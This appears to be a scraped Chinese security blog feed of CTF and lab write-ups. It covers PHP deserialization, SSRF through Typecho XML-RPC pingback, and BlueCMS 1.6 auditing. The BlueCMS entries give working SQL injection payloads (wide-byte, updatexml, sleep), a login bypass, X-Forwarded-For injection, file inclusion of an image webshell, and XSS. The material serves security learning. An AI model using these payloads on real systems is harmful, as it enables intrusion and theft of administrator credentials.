O:strlen:object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</li></ul><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>_construct()， <strong>destruct()， </strong>call()， <strong>callStatic()， </strong>get()， <strong>set()， </strong>isset()，<strong>unset()， </strong>sleep()， <strong>wakeup()， </strong>toString()， <strong>invoke()， </strong>set_state()，<strong>clone() 和 </strong>debugInfo() 等方法在 PHP 中被称为”魔术方法</p><p>魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用模式方法可以轻松实现PHP面向对象中重载。<br>我们先简单介绍几个魔术方法，如果想详细了解的话，点击<a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">魔术方法</a>;</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p>当我们调试程序时，需要知道是否得出正确的数据。比如打印一个对象时，看看这个对象都有哪些属性，其值是什么，如果类定义了toString方法，就能在测试时，<strong>echo打印对象体，对象就会自动调用它所属类定义的toString方法，</strong>格式化输出这个对象所包含的数据。</p><h3 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h3><p>当对象创建(new)时会主动调用。但在unserialize()时是不会自动调用的。（构造函数）</p><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>当对象被销毁时自动调用（析构函数）</p><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h3><p>如前所提，unserialize()时会自动调用；</p><h2 id="靶场实践"><a href="#靶场实践" class="headerlink" title="靶场实践"></a>靶场实践</h2><p>我们进入靶场，我们看到这样一个界面，他叫我们检查代码，那我们就点进去把！<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0wrzoupj31h70q8dgk.jpg" alt><br>这是一道ctf反序列化题目，看到提示flag就藏在本页面中同一目录的flag.php中，我们审计下代码<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0x1m4jej31hc0regmc.jpg" alt><br>①.前面定义了一个类，类中定义了一个方法，而且还是使用魔术方法<strong>toString,里面返回了readme.txt和调用显示source,因为在</strong>toString魔术方法中，所以只要将对象体打印(echo)出来就能调用。<br>highlight_file是高亮显示文件代码的意思；</p><p>②.在第一个if判断中，如果存在source以GET方式请求的话，就会实例化对象，并使source=<strong>FILE</strong>,<strong>FILE</strong>指本地当前文件路径，那就是说会调用$s对象中的source并使其等于<strong>FILE</strong>,<strong>FILE</strong>表示当前页面的完整路径，即会读取当前页面，并将对象体打印出来，那么上面的__toSteing也会被调用。</p><p>③.如果有存在todos这个cookie，那就<strong>截取cookie前32位长度，与前32位之后长度相对比，如果相等，就将cookie前32位之后的长度进行反序列化。</strong>那如果$_COOKIE[‘todos’]是可控的，那我们能不能<strong>构造payload让②的<strong>FILE</strong>文件改成我们想读取的flag.php文件，并将其序列化，并放到cookie中，并使条件成立，使得将我们想要文件被反序列化后输出出来</strong>，但我们还没看到输出的点。</p><p>后面我们发现了这个<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0xew1wlj30hg0p8q37.jpg" alt><br>&lt;?=$todo?&gt;是&lt;?php echo $todo ?&gt;的简写；<br>而$todo是根据$todos数组 foreach遍历出来的值</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0xm802pj31hb0f9aaf.jpg" alt><br>我们将<strong>FILE</strong>改成我们要读取的文件名，<strong>因为只有数组才能foreach遍历出值，所以我们要将序列化的对象先转换成数组</strong>，然后是序列化出来结果。</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0xvqj2aj30f404uq2r.jpg" alt><br>然后我们要做的下一步是通过让cookie满足条件，使cookie前32位与之后的相等，如果条件成立，那么就会实行反序列化出结果，并将其结果赋给$todos这个数组，然后遍历flag.php输出结果。那么，我们只需要将我们序列化的结果拼接都放进cookie中去，使其条件满足，反序列化出我们需要的结果</p><p>因为cookie前32位$h要等于32位之后md5加密后的值$m，所以我们要手动将前32位进行手动md5加密，使其等于32位以后的值。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0y37gnij31hc0rh77y.jpg" alt><br><code>$h=e2d4f7dcc43ee1db7f69e76303d0105c(手动md5加密)</code><br><code>$m=a:1:{i:0;O:6:&quot;readme&quot;:1:{s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;}}</code><br><code>md5($m)=e2d4f7dcc43ee1db7f69e76303d0105c</code></p><p>所以最后所生成cookie为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">todos=&gt;e2d4f7dcc43ee1db7f69e76303d0105ca:1:&#123;i:0;O:6:&quot;readme&quot;:1:&#123;s:6:&quot;source&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>因为生成cookie会主动进行一次url编码，然后存储后会进行一次url解码，因为我们手动生成cookie，所以我们要进行一次url编码，再将其放到cookie中去<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0ydiyo7j31hc0ipjwd.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0yuvdqej31ax0crwig.jpg" alt><br>将其放入cookie中，刷新，成功拿到flag；<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3l0zpxd5ej31hc0h6q4a.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF-服务器端请求伪造</title>
      <link href="/2019/12/07/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>/2019/12/07/SSRF-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF?"></a>什么是SSRF?</h1><p>SSRF(Server-Side Request Forgery:<strong>服务器端</strong>请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的<strong>内部系统</strong>。（因为他是从内部系统访问的，所以可以通过它攻击外网无法访问的<strong>内部系统(即内网)</strong>，也就是把目标网站当中间人;即<strong>利用一个可发起网络请求的服务当做跳板来攻击其他服务;</strong></p><p>通俗的说就是浏览器去访问服务都是通过浏览器本地去访问的，而SSRF就是攻击者通过命令服务器端去访问另一个服务，<strong>服务器端去访问</strong>并返回了访问数据</p><h2 id="SSRF原理详解"><a href="#SSRF原理详解" class="headerlink" title="SSRF原理详解"></a>SSRF原理详解</h2><p>首先，我们要对目标网站的架构了解，脑子了要有一个架构图。比如 ： A网站，是一个所有人都可以访问的外网网站并可以发起网络请求，B网站是一个他们内部的OA网站。</p><p>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以通过a网站做中间人，<strong>让a网站去代替我们去访问b网站，并返回数据，</strong>从而达到攻击b网站需求。那如果b网站是个内网网站，那我们就可以去通过a网站进入<strong>攻击外网无法访问的内网系统</strong>，攻击所在内网中网站、程序；</p><h2 id="SSRF的作用"><a href="#SSRF的作用" class="headerlink" title="SSRF的作用"></a>SSRF的作用</h2><ul><li>扫描内部网络(FingerPrint)(对输入连接没有限制，可以直通内网)</li><li>向<strong>内部</strong>主机的<strong>任意主机</strong>的<strong>任意端口</strong>发送我们精心构造的数据表(payload)</li><li>DDOS(请求大文件，始终保持连接Keep-Alive Alway)</li><li>暴力穷举(users/dirs/files)</li><li>内外网Web站点漏洞的利用(比如内网网站存在sql注入，因为是内网，网站管理员防范意识较低，那我们就可以通过存在漏洞达到我们的目的)</li><li>内外网主机应用程序漏洞的利用</li></ul><p>##靶场实战<br>我们进入靶场<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e2wptko9j31h90fyglw.jpg" alt><br>发现访问的是一个xmlrpc服务，但该服务<strong>只接受POST请求</strong>；我们发现这是一个typeecho的CMS,这个CMS是默认开启了XMLRPC服务的</p><p><strong>XML RPC</strong><br>(XML-RPC是一个远程过程调用（远端程序呼叫）（remote procedure call，RPC)的分布式计算协议，通过XML将调用函数封装，并使用http协议做为传输协议的rpc机制，使用xml文本的方式传输命令和数据。)</p><p>XMLRPC中有一个叫做pingback协议(pingback,<strong>通知网志系统文章被引用</strong>情况的一种手段)，我们可以直接使用；</p><p>POC如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line"> &lt;methodName&gt;pingback.ping&lt;/methodName&gt;</span><br><span class="line"> &lt;params&gt;</span><br><span class="line">    &lt;string&gt;http://127.0.0.1:1&lt;/string&gt;</span><br><span class="line"> &lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure><p>通过刷新抓包，将请求方式修改为POST方式，并将poc代码放到下面<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e4norujuj30z40qf40e.jpg" alt><br>这段poc说简单点，就是他会通过服务器端去ping内网的地址，并返回信息，通过返回信息知道端口的开放。<br>由于我们不知道开放端口，所以通过burp进行端口爆破<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e4o051cyj30z40ouq6c.jpg" alt><br>发现开放了两个端口，我们通过提示知道了内网88端口映射12388端口,<br>我们对12388端口进行访问，抓包看返回头，得到flag<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3e4oa3liaj30z40ovju0.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入--0day审计案例(二)</title>
      <link href="/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(2)/"/>
      <url>/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(2)/</url>
      
        <content type="html"><![CDATA[<p>我们开始进行代码审计、漏洞挖掘</p><h3 id="网站重装漏洞"><a href="#网站重装漏洞" class="headerlink" title="网站重装漏洞"></a>网站重装漏洞</h3><p>一般我要做一个CMS网站，首先要访问目录中的安装目录，进行安装、注册管理员账号。那我们站在黑客角度上想一想，我们如果知道了一个cms的安装目录路径，那我们是不是能进行二次访问进行重新安装呢？这样的话我们是不是就可以重置管理员账号和密码，登入后台进行getshell呢？<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418sjhanvj31h60rbwgy.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418t83yofj31h90pwdj9.jpg" alt><br>这样我们就可以进行重新安装了，而数据库账号密码，我们可以弄一个虚拟空间数据库，比如注入时用到的香港云。</p><h3 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h3><p>我们再来看这个网站，一般而言网站有展示类和功能类。</p><p>展示类（比如新闻站、门户站）</p><p>功能类（比如商城、OA、系统）</p><p>我们看到前台有一个注册功能，如果我们可以拿到一个普通用户的权限是不是更加容易渗透测试？测试的点是不是更多？<br>那么我们去注册一个账户吧！<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418thvsawj31h80osac3.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418tqqwkwj31h60qkdi5.jpg" alt><br>在注册之前，我们先开下burp，看下提交注册的数据包发往哪里去<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418u2kpw2j31gj0qhq6z.jpg" alt><br>发现它通过post方式将参数发送user.php ,我们注意到里面有act传进参数do_reg,我们通过代码审计工具找到user.php<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418ub5ui9j31hc0sgk2s.jpg" alt><br>我们发现这里是检查传进来的注册参数是否为空和有没有空格，并且加入一些检查格式<br>而我们在下面发现sql插入语句<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418uije5fj313b0i4tdu.jpg" alt><br>发现它并没有将注册的值进行过滤，而直接插入数据库中。那么这就很有可能存在XSS和sql注入。</p><p>我们先通过一个弹窗看看是否有xss，先抓一个包，并对其邮箱进行插入弹窗语句<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418uxubm8j30z40rkq4p.jpg" alt><br>成功弹窗，这里是一个存储型的XSS。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wavb2qj31h80pqjt2.jpg" alt></p><h3 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h3><p>在插入语句中<br><code>&quot;INSERT INTO &quot;.table(&#39;user&#39;).&quot; (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&#39;&#39;, &#39;$user_name&#39;, md5(&#39;$pwd&#39;), &#39;$email&#39;, &#39;$timestamp&#39;, &#39;$timestamp&#39;)&quot;;</code><br>这里插入没有过滤，由于email变量由一对单引号包着，所以我们试着在邮箱后面加个’,看看是否会报错<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wjbjauj30z40rkmyy.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wjbjauj30z40rkmyy.jpg" alt><br>发现还是注册成功了，那我们进后台看看<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418wxhl9tj30z50h1wfx.jpg" alt><br>发现’好像被实体化了，就是被\转义了，这好像是php配置中开启了魔术引号，那我们应该想到之前的宽字节注入，在引号前加%df，使其与\%5c合并,从而避免’被转义。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418x765fgj30z40rktag.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418xeyzpej30z40rkjtw.jpg" alt><br>发现报错了，那就说明存在注入<br>尝试使用updatexml的报错<br>构建下语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO blue_user (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&apos;&apos;, &apos;allblue1234&apos;, md5(&apos;allblue1234&apos;), &apos;allblue1234@qq.com�\&apos; or updatexml(1,concat(0x7e,(SELECT database())),1),1,1)#\&apos;&apos;, &apos;1560443115&apos;, &apos;1560443115&apos;)</span><br></pre></td></tr></table></figure></p><p>发现报错，没有显示我们想要的信息<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418xro0upj30z40rkacp.jpg" alt><br>但我发现放进数据库执行，却能成功(需将%df\  去掉)<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418xzi127j31560lgaeh.jpg" alt><br>那我们只能通过盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO blue_user (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&apos;&apos;, &apos;allblue1234&apos;, md5(&apos;allblue1234&apos;), &apos;allblue1234@qq.com�\&apos; or sleep(10),1,1)#\&apos;&apos;, &apos;1560443115&apos;, &apos;1560443115&apos;)</span><br></pre></td></tr></table></figure></p><p>以这种格式继续盲注下去。</p><p>但我们想到，insert into 是能插入多条数据呢，那我们是不是能通过语句构建，再建立一个用户，然后用子查询填充邮箱处，然后我们登陆这个账号是不是就可以看到邮箱字段里面的内容？<br>我们先抓包<br>这样就插入了两组数据，而在第二组数据中的邮箱就是管理员密码<br>我们执行一下，发现执行失败<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418ydsotkj30z40rktbf.jpg" alt><br>因为这里魔术引号会将引号转义，所以我们利用宽字节知识，将其转为16进制编码<br>allblue2019==&gt;0x616C6C626C756532303139<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418yodkozj30z40rkq6i.jpg" alt><br>注册成功，登录<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418yzxxk0j31gg0ovtaj.jpg" alt><br>将邮箱值进行md5解密，成功得到管理员密码<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418z7jwb3j31ha0ky3zn.jpg" alt></p><h3 id="登录框万能密码登录"><a href="#登录框万能密码登录" class="headerlink" title="登录框万能密码登录"></a>登录框万能密码登录</h3><p>我们尝试登录抓包<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418zidhbij30z40rk760.jpg" alt><br>找到传参的位置，在审计工具查找<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g418zussp9j31hc0sm49l.jpg" alt><br>发现这里判断了是否为管理员，没有对登录参数进行限制，这可能存在POST注入<br>post注入，首先尝试着使用万能密码登录<br><code>%df&#39;) or 1=1#</code><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g41902f5r4j30z40rkwg9.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4190a2wpfj31hb0i6aae.jpg" alt><br>成功登录<br>然后登录后修改资料处也存在SQL注入和XSS</p><h3 id="X-Forwarded-For注入"><a href="#X-Forwarded-For注入" class="headerlink" title="X-Forwarded-For注入"></a>X-Forwarded-For注入</h3><p>我们通过一个普通用户发布了新闻<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4190jiyuoj31hc0lndhp.jpg" alt><br>通过重新注册一个用户对其进行评论<br>评论成功<br>那么这可能也存在XSS。<br>我们评论时先抓个包看看<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4193ify2nj31hc0mlq4z.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4193tropfj30z40rkwgc.jpg" alt><br>发现他会将参数send提交到comment.php,那么我们去看一看</p><p>我们发现这里面有一些函数<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194117l1j31hc0sm116.jpg" alt></p><ul><li><p>intval()<br>intval() 函数用于获取变量的整数值。<br>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p></li><li><p>htmlspecialchars()<br>把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体</p></li><li><p>nl2br()<br>在字符串中的新行（\n）之前插入换行符<br>所以XSS肯定是没戏了。</p></li></ul><p>这时，我们看到了他在插入的时候，记录了评论用户的ip，我们发现了getip函数，我们定位一下函数<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194argjyj31dy0q7n3k.jpg" alt><br>找到了定义的函数，这里有一个getenv，实际上就是获取系统的环境变量</p><p>第一个HTTP_CLIENT_IP这个环境变量没有成标准，很多服务器完全没法获取</p><p>第二个X-Forwarded-For是个扩展请求头，这个东西可以通过HTTP请求头来修改。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194mh7qkj31cy0oudle.jpg" alt><br>那么我们是不是可以修改X-Forwarder-For的参数，将参数插入到ip中，那么ip的值就会放入sql语句中执行呢?<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4194usqr2j31h90nxtas.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g41953pdecj30zh0kydhq.jpg" alt><br>我们给个分号测试一下<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4195bynenj31ga0nltar.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4195kp9p5j31hc0fdt8t.jpg" alt><br>发现成功报错<br>因为X-Forwarded-For是直接获取的，所以不会出现魔术引号。<br>这里我们直接用sqlmap 就能直接跑出来了<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4195ssd3yj30xz0hrq4w.jpg" alt></p><h3 id="数据库备份文件泄露"><a href="#数据库备份文件泄露" class="headerlink" title="数据库备份文件泄露"></a>数据库备份文件泄露</h3><p>有时候，管理员在备份数据库的时候，直接默认将备份文件直接放在网站目录下，这样其实是很危险的，很容易被黑客摸出来。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g41964opglj31hc0omjv5.jpg" alt><br>我们登入后台，发现了一个数据库备份，好，那我们将数据库备份<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4196cvcatj31hc0bsdgs.jpg" alt><br>我们到网站目录看一下<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4196lq5n3j30st05pt8r.jpg" alt><br>发现他的命名规则是备份的年月日，那如果我们拿到一个CMS，知道他的备份目录，是不是可以尝试着爆破一下备份文件<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4196v5eboj31gt0q4wft.jpg" alt></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含，首先需要找到包含函数<br>我们在找到了一个貌似可以控制的include函数，不过需要act参数=pay的时候才能执行<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g419766cocj31e10osn4c.jpg" alt><br>最后在购买充值卡那找到<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4197f34tlj31hc0m241t.jpg" alt><br>我们先找到一个能上传图片马的上传点<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4197mhek1j31h90jqtac.jpg" alt><br>成功上传<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4197vln3uj31h80k40t7.jpg" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &apos;include/payment/&apos;.$_POST[&apos;pay&apos;].&quot;/index.php&quot;;</span><br></pre></td></tr></table></figure></p><p>文件包含的路径</p><p>那么我们将木马路径传入到post参数中，那么路径为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay=../../data/upload/face_pic/15605135978.jpg</span><br></pre></td></tr></table></figure></p><p>这样的话，包含语句就会变成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &apos;include/payment/../../data/upload/face_pic/15605135978.jpg/index.php&quot;;</span><br></pre></td></tr></table></figure></p><p>但是这样的话，后面还有个index。php，他会去加载index.php,会对加载图片马有所影响，那么我们需要将index.php截取掉，这里00截断试过了，php低版本才会存在这样的截断。</p><p>在这里我们可以尝试一个字符串截断的方法（Windows的路径不能超过60个字符）在Windows API中，路径的最大长度为MAX_PATH，MAX_PATH被定义为260。</p><p>那么我们是不是可以尝试在传参的后面加点进行截断，因为点最后会被windows给处理掉，但是填充了点之后，只会保留包含前面15605093967.png，在传参后的index.php因为路径超过260个字符后的东西都会被舍弃，于是乎我们直接传参后加260个点就可以截断了。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g4198wnf3nj30z40ni0ue.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g419azj97kj30h10n73zx.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入--0day审计案例(1)</title>
      <link href="/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(1)/"/>
      <url>/2019/12/07/sql%E6%B3%A8%E5%85%A5--0day%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B(1)/</url>
      
        <content type="html"><![CDATA[<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>这次我们讲的是一篇适合新手学习的代码审计，因为是给小白学习的代码审计，所以可以利用黑盒+白盒交叉审计的情况下，更好的帮助小白学习并找出漏洞。</p><h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>phpstudy<br>BlueCMS1.6 sp1源码<br>代码审计工具(Seay源代码审计系统)</p><h3 id="审计思路："><a href="#审计思路：" class="headerlink" title="审计思路："></a>审计思路：</h3><p>一般来说，有一定代码功力的人审计代码,会直接将全文代码通读一遍，并寻找传参进行代码审计，但这是对有一定代码功力的人而言。</p><p>而对小白而言，利用黑盒和白盒交叉审计的情况下，更能帮助我们找到漏洞。</p><p>我们拿到一个CMS后，可以<strong>先寻找功能点</strong>，然后将功能点罗列出来，并对其功能点进行不断测试，然后在拿到代码的情况下，我们可以<strong>对功能点所对应的传参进行审计，那如果知道了传参的意义，就等于知道代码会去做什么，要去做什么了呢</strong>。<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3znruehwoj30za0rkjud.jpg" alt></p><h3 id="大概测试流程："><a href="#大概测试流程：" class="headerlink" title="大概测试流程："></a>大概测试流程：</h3><ul><li><strong>总结功能点</strong></li><li><strong>黑盒测试功能点：</strong></li></ul><p>①黑盒测试测不出来的地方进行白盒审计</p><p>②测试结果进行白盒审计</p><h3 id="Seay源码审计系统"><a href="#Seay源码审计系统" class="headerlink" title="Seay源码审计系统"></a>Seay源码审计系统</h3><p>常见功能简介：<br>1.代码自动高亮<br>2.可以自动审计（误报率高）<br>3.可以快速全局搜索<br>4.可以定位函数<br>5可以监控Mysql(插件)<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3znttjhddj31fo0rpn5h.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3znu53w7bj31hb0rk792.jpg" alt></p><hr><p>这里我们只讲了代码审计的续篇，下一篇文章我们会开始进行代码审计、漏洞挖掘。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>head头注入</title>
      <link href="/2019/12/07/sql_head/"/>
      <url>/2019/12/07/sql_head/</url>
      
        <content type="html"><![CDATA[<p><strong>在讲head注入之前，我们先来了解一些PHP的一些超全局变量，在php中有很多预定义的超全局变量，这就意味着他们在一个脚本的任何作用域都可用：</strong></p><p><strong>$_REQUEST:</strong>（获取get，post，cookie的传参，但在新版本中已无法获取cookie传参了）</p><p><strong>$_POST:</strong>（获取post传参）</p><p><strong>$_GET:</strong>(获取get的传参)</p><p><strong>$_COOKIE:</strong>(获取cookie的传参)</p><p><strong>$_SERVER</strong>(包含了诸如头信息(header),路径(path)等用户信息)</p><h3 id="转义函数"><a href="#转义函数" class="headerlink" title="转义函数"></a>转义函数</h3><p><strong>addslashes()</strong> 函数返回在预定义字符之前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul><p>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p><p>注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您<br>不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。</p><p>遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</p><p>语法：addslashes(string)</p><p>string 必需。规定要转义的字符串。</p><p>返回值： 返回已转义的字符串。</p><p>PHP 版本： 4+</p><ul><li>stripslashes()</li></ul><p>函数删除由 addslashes() 函数添加的反斜杠。</p><p> <strong>mysql_real_escape_string()</strong></p><p>函数转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p><ul><li><p>\x00</p></li><li><p>\n</p></li><li><p>\r</p></li><li><p>\</p></li><li><p>‘</p></li><li><p>“</p></li><li><p>\x1a</p></li></ul><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p><p>语法：mysql_real_escape_string(string,connection)</p><p>string 必需。规定要转义的字符串。</p><p>connection 可选。规定 MySQL 连接。</p><p>如果未规定，则使用上一个连接。</p><p>说明：本函数将 string 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用<br>于 mysql_query()。</p><h2 id="在这里我们用sqli-靶场less-18为例，"><a href="#在这里我们用sqli-靶场less-18为例，" class="headerlink" title="在这里我们用sqli-靶场less-18为例，"></a>在这里我们用sqli-靶场less-18为例，</h2><p>在此关源代码中我们看到代码中用check_input函数，对uname和passwd进行转义，所以不能在对username和password框进行注入了<br><img src="http://m.qpic.cn/psb?/V10ZDHQP2itaxQ/nwswSpT55o1rDq4PQUE4HrdNkta0ob3ZmTFzPVC*JSg!/b/dL8AAAAAAAAA&amp;bo=6QFKAAAAAAADF5A!&amp;rf=viewer_4" alt></p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP2itaxQ/i*8eUgB0PmYpObHDUHxSCd*Tm5FLKf2TZEARLVerTFE!/b/dLkAAAAAAAAA&amp;bo=QQJVAAAAAAADFyQ!&amp;rf=viewer_4" alt><br>在往下代码我们看到了插入语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;,</span><br><span class="line">&apos;$IP&apos;, $uname)&quot;;</span><br></pre></td></tr></table></figure></p><p>这穿代码将user-agent和ip插入了数据库，而我们的控制点也是这两个，那我们是不是能利用user-agent和ip进行插入，我们可以通过抓包修改他的user-agent进而来进行注入</p><h4 id="我们先来说一下updatexml-函数"><a href="#我们先来说一下updatexml-函数" class="headerlink" title="我们先来说一下updatexml() 函数"></a>我们先来说一下<strong>updatexml() 